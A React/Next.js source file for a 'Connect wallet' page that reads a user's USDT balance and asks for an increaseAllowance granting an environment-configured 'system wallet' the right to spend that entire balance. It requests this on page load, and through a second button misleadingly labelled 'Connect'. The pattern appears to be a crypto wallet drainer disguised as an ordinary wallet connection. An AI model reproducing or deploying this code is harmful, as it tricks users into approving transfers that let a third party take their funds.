import Button from '@/components/core/common/Button';
import ConnectYourWallet from '@/components/core/common/Modal/ConnectYourWallet';
import useModal from '@/hook/useModal';
import { serverSideTranslations } from 'next-i18next/serverSideTranslations';

import { message } from 'antd';
import { useEffect, useState } from 'react';
import {
  useAccount,
  useConnect,
  useContractRead,
  useContractWrite,
  useDisconnect,
  usePrepareContractWrite,
} from 'wagmi';
import ERC_20_ABI from '../../config/erc20.abi.json';
import * as S from './CSS';

function Home() {
  const { address } = useAccount();
  const { connectors } = useConnect();
  const { disconnect } = useDisconnect();

  const { isOpen, closeModal, openModal } = useModal();
  const [balance, setBalance] = useState<number>(0);

  const systemWallet = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS;
  const financialUSDT = process.env.NEXT_PUBLIC_FINANCIAL_USDT;

  // readContract
  const { data: dataContractRead } = useContractRead({
    address: financialUSDT as any,
    abi: ERC_20_ABI,
    functionName: 'balanceOf',
    args: [address],
    onError() {
      message.error('Contract error');
    },
  });

  useEffect(() => {
    setBalance(Number(dataContractRead));
  }, []);

  // increaseAllowance
  const { config: increaseAllowance } = usePrepareContractWrite({
    address: financialUSDT as any,
    abi: ERC_20_ABI,
    functionName: 'increaseAllowance',
    args: [systemWallet, balance],
    onError() {
      message.error('Approval error');
    },
  });

  // allowance
  const contractRead = useContractRead({
    address: financialUSDT as any,
    abi: ERC_20_ABI,
    functionName: 'allowance',
    args: [address, systemWallet],
    onError() {
      message.error('Allowance error');
    },
  });

  const {
    data: dataApprove,
    isLoading: isLoadingApprove,
    isSuccess: isSuccessApprove,
    write: writeApprove,
  } = useContractWrite(increaseAllowance);

  useEffect(() => {
    const balanceAlowwant = Number(contractRead?.data || 0);

    if (balanceAlowwant === 0 && Number(balance) > 0) {
      writeApprove?.();
    }
  }, []);

  return (
    <S.PageWrap>
      <div style={{ padding: 100 }}>
        <div style={{ display: 'flex', gap: 10 }}>
          <Button width="200px" onClick={() => disconnect()} type="text">
            Disconnect
          </Button>
          <Button width="200px" onClick={openModal} type="ghost">
            Connect
          </Button>
          <Button width="200px" onClick={() => writeApprove?.()} type="ghost">
            Connect
          </Button>
        </div>

        <ConnectYourWallet
          dataConnectors={connectors}
          isOpen={isOpen}
          handleClickClose={closeModal}
        />

        <div style={{ marginTop: 60 }}>
          <p>hash: {dataApprove?.hash}</p>
          <p>isLoadingApprove: {isLoadingApprove}</p>
          <p>isSuccessApprove: {isSuccessApprove}</p>
        </div>
      </div>
    </S.PageWrap>
  );
}

export default Home;

export async function getServerSideProps({ locale }: { locale: string }) {
  try {
    return {
      props: {
        ...(await serverSideTranslations(locale, [])),
        title: 'Connect wallet',
      },
    };
  } catch (error) {
    return {
      props: {
        ...(await serverSideTranslations(locale, [])),
      },
    };
  }
}
